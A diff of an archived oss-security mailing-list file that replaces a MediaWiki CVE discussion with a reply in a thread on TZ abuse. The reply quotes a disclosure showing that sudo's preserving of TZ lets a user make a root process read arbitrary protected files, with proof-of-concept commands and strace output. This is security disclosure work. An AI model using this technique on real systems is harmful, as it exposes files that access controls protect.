@@ -1,34 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/06/26/17
-Message-ID: <20140626193238.507c5845@hboeck.de>
-Date: Thu, 26 Jun 2014 19:32:38 +0200
-From: Hanno Böck <hanno@...eck.de>
-To: oss-security@...ts.openwall.com
-Subject: Re: MediaWiki releases 1.19.17, 1.21.11, 1.22.8 and 1.23.1
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/16/2
+Message-Id: <D4B77685-5992-4775-BC8F-3FB20083CA4A@omniti.com>
+Date: Wed, 15 Oct 2014 19:52:50 -0400
+From: Dan McDonald <danmcd@...iti.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Re: Abusing TZ for fun (and little profit)
 Content-Type: text/plain; charset=utf-8
 
-On Wed, 25 Jun 2014 17:03:33 -0700
-Chris Steipp <csteipp@...imedia.org> wrote:
+Libraries that use TZ (or any environment variable) should be careful.  For example...
 
-> Since the bug is public now
-> (http://lists.wikimedia.org/pipermail/mediawiki-announce/2014-June/000155.html),
-> I didn't get a CVE in advance because I thought this was likely a
-> hardening fix. We couldn't find a way to exploit it to actually track
-> a user on our site. However, we kept it private until we released the
-> patch, since we weren't sure it couldn't be exploited on a wiki with
-> non-standard image handling.
+http://src.illumos.org/source/xref/illumos-gate/usr/src/lib/libc/port/gen/localtime.c#1417
 
-This is probably another very fundamental question of CVE assignment,
-but IMHO: "We're not sure if this can be exploited" is certainly worth
-a CVE.
+Thanks for the reality check.  Glad we passed.
 
-I'd suggest that one gets assigned.
+Dan
 
--- 
-Hanno Böck
-http://hboeck.de/
+Sent from my iPhone (typos, autocorrect, and all)
 
-mail/jabber: hanno@...eck.de
-GPG: BBB51E42
+> On Oct 15, 2014, at 6:35 PM, Jakub Wilk <jwilk@...lk.net> wrote:
+> 
+> By default, sudo preserves the TZ variable[1] from user's environment. This is a bad idea on glibc systems, where TZ can be abused to trick the program to read an arbitrary file. PoC:
+> 
+> $ echo moo > tz
+> $ chmod 0 tz
+> $ cat tz
+> cat: tz: Permission denied
+> $ TZ=$PWD/tz sudo -u root strace -e read date
+> read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0"..., 512) = 512
+> read(3, "moo\n", 4096)                  = 4
+> read(3, "", 4096)                       = 0
+> Wed Oct 15 20:42:42  2014
+> +++ exited with 0 +++
+> 
+> 
+> Procmail is another program that recklessly whitelists TZ[2].
+> 
+> 
+> [1] https://sources.debian.net/src/sudo/1.8.5p2-1%2Bnmu1/plugins/sudoers/env.c/?hl=198#L189
+> [2] https://sources.debian.net/src/procmail/3.22-20%2Bdeb7u1/config.h/?hl=22#L13
+> 
+> -- 
+> Jakub Wilk
 
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
